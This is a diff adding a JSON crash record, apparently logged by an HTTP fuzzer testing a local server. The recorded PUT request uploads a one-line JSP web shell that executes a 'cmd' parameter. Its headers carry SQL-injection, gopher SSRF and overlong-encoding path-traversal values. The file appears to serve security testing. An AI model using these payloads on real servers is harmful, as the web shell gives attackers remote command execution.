@@ -1,0 +1,25 @@
+{
+  "timestamp": "2025-12-29T14:40:01.625692",
+  "crash_type": "server_crash",
+  "payload": "PUT /shell.jsp?\nHeaders: {'User-Agent': 'curl/7.68.0', 'Accept-Encoding': '4294967296', 'Accept': '*/*', 'Connection': 'close', 'Host': '127.0.0.1:8080', 'X-Original-Url': 'gopher://localhost:25', 'X-Forwarded-Host': \"' OR '1'='1\", 'X-Forwarded-For': '%c0%ae%c0%ae/', 'Content-Range': 'bytes 0-100/101', 'Content-Length': '59'}\nBody: <%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
+  "payload_hash": "44cdd49edd692b9b",
+  "request_method": "PUT",
+  "request_path": "/shell.jsp?",
+  "request_headers": {
+    "User-Agent": "curl/7.68.0",
+    "Accept-Encoding": "4294967296",
+    "Accept": "*/*",
+    "Connection": "close",
+    "Host": "127.0.0.1:8080",
+    "X-Original-Url": "gopher://localhost:25",
+    "X-Forwarded-Host": "' OR '1'='1",
+    "X-Forwarded-For": "%c0%ae%c0%ae/",
+    "Content-Range": "bytes 0-100/101",
+    "Content-Length": "59"
+  },
+  "request_body": "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
+  "error_message": "Simulated server_crash",
+  "stack_trace": null,
+  "fuzzer_variant": null,
+  "iteration": 218
+}
